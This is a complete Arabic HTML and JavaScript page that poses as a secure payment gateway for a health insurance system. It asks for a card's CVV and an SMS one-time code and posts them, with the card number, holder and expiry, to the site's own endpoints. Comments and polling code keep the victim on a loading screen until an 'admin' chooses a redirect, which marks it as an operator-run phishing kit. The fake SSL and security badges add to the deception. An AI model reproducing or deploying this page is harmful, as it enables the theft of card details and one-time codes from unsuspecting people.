<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>تأكيد الدفع - نظام الضمان الصحي</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: linear-gradient(135deg, #0a1628 0%, #1a2a4a 50%, #0a1628 100%);
      min-height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .payment-wrapper {
      width: 100%;
      max-width: 480px;
    }
    .bank-header {
      background: linear-gradient(135deg, #1a3a6b, #0d2447);
      border-radius: 16px 16px 0 0;
      padding: 20px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 2px solid #2a4a8a;
    }
    .bank-logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .bank-logo i { font-size: 1.8rem; color: #4a9eff; }
    .bank-logo span { color: white; font-size: 1rem; font-weight: 600; }
    .secure-badge {
      display: flex;
      align-items: center;
      gap: 5px;
      background: rgba(16, 185, 129, 0.15);
      border: 1px solid rgba(16, 185, 129, 0.4);
      border-radius: 20px;
      padding: 4px 12px;
      color: #10b981;
      font-size: 0.75rem;
    }
    .payment-card {
      background: #0f1e35;
      border: 1px solid #1e3a5f;
      border-top: none;
      border-radius: 0 0 16px 16px;
      padding: 28px 24px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    }
    .amount-section {
      background: linear-gradient(135deg, #1a3a6b, #0d2447);
      border-radius: 12px;
      padding: 16px 20px;
      margin-bottom: 24px;
      text-align: center;
      border: 1px solid #2a4a8a;
    }
    .amount-label { color: #7a9cc0; font-size: 0.8rem; margin-bottom: 4px; }
    .amount-value { color: white; font-size: 1.8rem; font-weight: 700; }
    .amount-currency { color: #4a9eff; font-size: 1rem; }
    .card-display {
      background: linear-gradient(135deg, #1e3a6b 0%, #2a5298 100%);
      border-radius: 12px;
      padding: 16px 20px;
      margin-bottom: 20px;
      position: relative;
      overflow: hidden;
      border: 1px solid #3a5a9a;
    }
    .card-display::before {
      content: '';
      position: absolute;
      top: -30px; right: -30px;
      width: 120px; height: 120px;
      border-radius: 50%;
      background: rgba(255,255,255,0.05);
    }
    .card-display::after {
      content: '';
      position: absolute;
      bottom: -40px; left: -20px;
      width: 150px; height: 150px;
      border-radius: 50%;
      background: rgba(255,255,255,0.03);
    }
    .card-number-display {
      color: rgba(255,255,255,0.7);
      font-size: 1rem;
      letter-spacing: 3px;
      font-family: monospace;
      margin-bottom: 8px;
    }
    .card-info-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .card-holder { color: rgba(255,255,255,0.8); font-size: 0.85rem; }
    .card-expiry { color: rgba(255,255,255,0.8); font-size: 0.85rem; }
    .form-section { margin-bottom: 20px; }
    .form-label-custom {
      color: #94a3b8;
      font-size: 0.82rem;
      margin-bottom: 6px;
      display: block;
    }
    .cvv-input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }
    .cvv-input {
      background: #0a1628;
      border: 2px solid #1e3a5f;
      border-radius: 10px;
      color: white;
      font-size: 1.4rem;
      letter-spacing: 8px;
      text-align: center;
      padding: 14px 50px 14px 14px;
      width: 100%;
      transition: all 0.3s;
      font-family: monospace;
    }
    .cvv-input:focus {
      outline: none;
      border-color: #4a9eff;
      box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.15);
      background: #0d1f38;
    }
    .cvv-input::placeholder { color: #2a4a6a; letter-spacing: 4px; font-size: 1rem; }
    .cvv-icon {
      position: absolute;
      left: 14px;
      color: #4a9eff;
      font-size: 1.2rem;
    }
    .cvv-hint {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #64748b;
      font-size: 0.75rem;
      margin-top: 6px;
    }
    .otp-section {
      background: rgba(74, 158, 255, 0.05);
      border: 1px solid rgba(74, 158, 255, 0.2);
      border-radius: 10px;
      padding: 14px;
      margin-bottom: 20px;
      display: none;
    }
    .otp-section.show { display: block; }
    .otp-label { color: #7ab3ff; font-size: 0.82rem; margin-bottom: 8px; }
    .otp-inputs { display: flex; gap: 8px; justify-content: center; }
    .otp-input {
      width: 46px; height: 52px;
      background: #0a1628;
      border: 2px solid #1e3a5f;
      border-radius: 8px;
      color: white;
      font-size: 1.4rem;
      text-align: center;
      font-family: monospace;
      transition: all 0.3s;
    }
    .otp-input:focus {
      outline: none;
      border-color: #4a9eff;
      box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.15);
    }
    .submit-btn {
      width: 100%;
      background: linear-gradient(135deg, #1a6bff, #0d4fd4);
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 1rem;
      font-weight: 600;
      padding: 14px;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 12px;
    }
    .submit-btn:hover { background: linear-gradient(135deg, #2a7bff, #1a5fe4); transform: translateY(-1px); }
    .submit-btn:active { transform: translateY(0); }
    .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
    .cancel-btn {
      width: 100%;
      background: transparent;
      border: 1px solid #2a3a5a;
      border-radius: 10px;
      color: #64748b;
      font-size: 0.9rem;
      padding: 11px;
      cursor: pointer;
      transition: all 0.3s;
    }
    .cancel-btn:hover { border-color: #ef4444; color: #ef4444; }
    .security-info {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      color: #475569;
      font-size: 0.72rem;
      margin-top: 16px;
    }
    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.7);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      flex-direction: column;
      gap: 16px;
    }
    .loading-overlay.show { display: flex; }
    .spinner {
      width: 50px; height: 50px;
      border: 4px solid rgba(74, 158, 255, 0.2);
      border-top-color: #4a9eff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-text { color: white; font-size: 0.9rem; }
    .error-msg {
      background: rgba(239, 68, 68, 0.1);
      border: 1px solid rgba(239, 68, 68, 0.3);
      border-radius: 8px;
      color: #ef4444;
      font-size: 0.82rem;
      padding: 10px 14px;
      margin-bottom: 14px;
      display: none;
    }
    .error-msg.show { display: block; }
    .success-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.85);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      flex-direction: column;
      gap: 16px;
    }
    .success-overlay.show { display: flex; }
    .success-icon { font-size: 4rem; color: #10b981; animation: bounce 0.6s ease; }
    @keyframes bounce { 0%,100%{transform:scale(1)} 50%{transform:scale(1.2)} }
    .success-text { color: white; font-size: 1.1rem; font-weight: 600; }
    .success-sub { color: #94a3b8; font-size: 0.85rem; }
    .step-indicator {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 20px;
    }
    .step { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 600; }
    .step.done { background: #10b981; color: white; }
    .step.active { background: #4a9eff; color: white; }
    .step.pending { background: #1e3a5f; color: #64748b; }
    .step-line { width: 40px; height: 2px; background: #1e3a5f; }
    .step-line.done { background: #10b981; }
  </style>
</head>
<body>

<!-- Loading Overlay -->
<div class="loading-overlay" id="loadingOverlay">
  <div class="spinner"></div>
  <div class="loading-text" id="loadingText">جاري معالجة الطلب...</div>
</div>

<!-- Success Overlay -->
<div class="success-overlay" id="successOverlay">
  <i class="bi bi-check-circle-fill success-icon"></i>
  <div class="success-text">تمت العملية بنجاح</div>
  <div class="success-sub">جاري تحويلك...</div>
</div>

<div class="payment-wrapper">
  <!-- Header -->
  <div class="bank-header">
    <div class="bank-logo">
      <i class="bi bi-shield-fill-check"></i>
      <span>بوابة الدفع الآمنة</span>
    </div>
    <div class="secure-badge">
      <i class="bi bi-lock-fill"></i>
      <span>SSL مشفر</span>
    </div>
  </div>

  <!-- Payment Card -->
  <div class="payment-card">

    <!-- Step Indicator -->
    <div class="step-indicator">
      <div class="step done"><i class="bi bi-check"></i></div>
      <div class="step-line done"></div>
      <div class="step done"><i class="bi bi-check"></i></div>
      <div class="step-line done"></div>
      <div class="step active">3</div>
      <div class="step-line"></div>
      <div class="step pending">4</div>
    </div>

    <!-- Amount -->
    <div class="amount-section">
      <div class="amount-label">المبلغ المطلوب</div>
      <div class="amount-value">
        <span id="displayAmount">--</span>
        <span class="amount-currency"> ر.س</span>
      </div>
    </div>

    <!-- Card Display -->
    <div class="card-display">
      <div class="card-number-display" id="displayCardNumber">•••• •••• •••• ••••</div>
      <div class="card-info-row">
        <div class="card-holder" id="displayCardHolder">حامل البطاقة</div>
        <div class="card-expiry" id="displayExpiry">MM/YY</div>
      </div>
    </div>

    <!-- Error Message -->
    <div class="error-msg" id="errorMsg"></div>

    <!-- CVV Section -->
    <div class="form-section" id="cvvSection">
      <label class="form-label-custom">رمز الأمان (CVV/CVC)</label>
      <div class="cvv-input-wrapper">
        <input
          type="password"
          class="cvv-input"
          id="cvvInput"
          placeholder="•••"
          maxlength="4"
          inputmode="numeric"
          autocomplete="cc-csc"
        />
        <i class="bi bi-credit-card-2-back cvv-icon"></i>
      </div>
      <div class="cvv-hint">
        <i class="bi bi-info-circle"></i>
        <span>الرقم المكون من 3 أو 4 أرقام على ظهر البطاقة</span>
      </div>
    </div>

    <!-- OTP Section -->
    <div class="otp-section" id="otpSection">
      <div class="otp-label">
        <i class="bi bi-phone me-1"></i>
        أدخل رمز التحقق المرسل إلى هاتفك
      </div>
      <div class="otp-inputs">
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp1" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp2" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp3" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp4" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp5" />
        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" id="otp6" />
      </div>
    </div>

    <!-- Submit Button -->
    <button class="submit-btn" id="submitBtn" onclick="handleSubmit()">
      <i class="bi bi-lock-fill"></i>
      <span id="submitText">تأكيد الدفع</span>
    </button>

    <!-- Cancel Button -->
    <button class="cancel-btn" onclick="handleCancel()">
      إلغاء العملية
    </button>

    <!-- Security Info -->
    <div class="security-info">
      <i class="bi bi-shield-check"></i>
      <span>محمي بتشفير 256-bit SSL | بيانات آمنة ومشفرة</span>
    </div>

  </div>
</div>

<script>
  // قراءة البيانات من URL params
  const params = new URLSearchParams(window.location.search);
  const referenceId = params.get('ref') || '';
  const amount = params.get('amount') || '0.00';
  const cardNumber = params.get('card') || '';
  const cardHolder = params.get('holder') || 'حامل البطاقة';
  const expiry = params.get('expiry') || 'MM/YY';

  // عرض البيانات
  document.getElementById('displayAmount').textContent = amount;
  document.getElementById('displayCardHolder').textContent = cardHolder;
  document.getElementById('displayExpiry').textContent = expiry;

  if (cardNumber) {
    const masked = cardNumber.replace(/\d(?=\d{4})/g, '•');
    const formatted = masked.replace(/(.{4})/g, '$1 ').trim();
    document.getElementById('displayCardNumber').textContent = formatted;
  }

  // اكتشاف إذا كانت الصفحة /otp
  const isOtpPage = window.location.pathname === '/otp';
  let currentStep = isOtpPage ? 'otp' : 'cvv';

  if (isOtpPage) {
    // إخفاء CVV وإظهار OTP مباشرة
    document.getElementById('cvvSection').style.display = 'none';
    document.getElementById('otpSection').classList.add('show');
    const submitText = document.getElementById('submitText');
    if (submitText) submitText.textContent = 'تأكيد رمز OTP';
    // تغيير العنوان
    document.title = 'رمز التحقق OTP - نظام الضمان الصحي';
    const bankLogoSpan = document.querySelector('.bank-logo span');
    if (bankLogoSpan) bankLogoSpan.textContent = 'التحقق برمز OTP';
  }

  // OTP inputs auto-focus
  document.querySelectorAll('.otp-input').forEach((input, idx, inputs) => {
    input.addEventListener('input', () => {
      if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && idx > 0) inputs[idx - 1].focus();
    });
  });

  async function handleSubmit() {
    const btn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    errorMsg.classList.remove('show');

    if (currentStep === 'cvv') {
      const cvv = document.getElementById('cvvInput').value.trim();
      if (!cvv || cvv.length < 3) {
        showError('يرجى إدخال رمز CVV الصحيح');
        return;
      }

      btn.disabled = true;
      showLoading('جاري التحقق من البطاقة...');

      try {
        const res = await fetch('/api/cvv-submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ referenceId, cvv, amount, cardNumber, cardHolder, expiry })
        });
        const data = await res.json();
        hideLoading();

        if (data.success) {
          if (data.requireOtp) {
            currentStep = 'otp';
            document.getElementById('cvvSection').style.display = 'none';
            document.getElementById('otpSection').classList.add('show');
            document.getElementById('submitText').textContent = 'تأكيد رمز التحقق';
            btn.disabled = false;
          } else if (data.redirect) {
            showSuccess();
            setTimeout(() => { window.location.href = data.redirect; }, 2000);
          } else {
            // بقاء في صفحة تحميل حتى يوجه الأدمين
            showWaiting();
            startRedirectPolling(data.referenceId || referenceId);
          }
        } else {
          showError(data.message || 'رمز CVV غير صحيح، يرجى المحاولة مجدداً');
          btn.disabled = false;
        }
      } catch (err) {
        hideLoading();
        showError('حدث خطأ في الاتصال، يرجى المحاولة مجدداً');
        btn.disabled = false;
      }

    } else if (currentStep === 'otp') {
      const otp = ['otp1','otp2','otp3','otp4','otp5','otp6'].map(id => document.getElementById(id).value).join('');
      if (otp.length < 6) {
        showError('يرجى إدخال رمز التحقق كاملاً');
        return;
      }

      btn.disabled = true;
      showLoading('جاري التحقق من الرمز...');

      try {
        const res = await fetch('/api/otp-submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ referenceId, otp })
        });
        const data = await res.json();
        hideLoading();

        if (data.success) {
          if (data.redirect) {
            showSuccess();
            setTimeout(() => { window.location.href = data.redirect; }, 2000);
          } else {
            // بقاء في صفحة تحميل حتى يوجه الأدمين
            showWaiting();
            startRedirectPolling(data.referenceId || referenceId);
          }
        } else {
          showError(data.message || 'رمز التحقق غير صحيح');
          btn.disabled = false;
        }
      } catch (err) {
        hideLoading();
        showError('حدث خطأ في الاتصال');
        btn.disabled = false;
      }
    }
  }

  function handleCancel() {
    if (confirm('هل تريد إلغاء العملية؟')) {
      window.history.back();
    }
  }

  function showError(msg) {
    const el = document.getElementById('errorMsg');
    el.textContent = msg;
    el.classList.add('show');
  }

  function showLoading(text) {
    document.getElementById('loadingText').textContent = text || 'جاري المعالجة...';
    document.getElementById('loadingOverlay').classList.add('show');
  }

  function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('show');
  }

  function showSuccess() {
    document.getElementById('successOverlay').classList.add('show');
  }

  // صفحة تحميل - بقاء حتى يوجه الأدمين
  function showWaiting() {
    const overlay = document.getElementById('loadingOverlay');
    overlay.classList.add('show');
    document.getElementById('loadingText').textContent = 'جاري معالجة طلبك، يرجى الانتظار...';
  }

  let pollingInterval = null;
  function startRedirectPolling(ref) {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
      try {
        const r = await fetch('/api/check-redirect/' + encodeURIComponent(ref));
        const d = await r.json();
        if (d.success && d.redirect) {
          clearInterval(pollingInterval);
          showSuccess();
          setTimeout(() => { window.location.href = d.redirect; }, 1500);
        }
      } catch(e) {}
    }, 3000);
  }
</script>
</body>
</html>
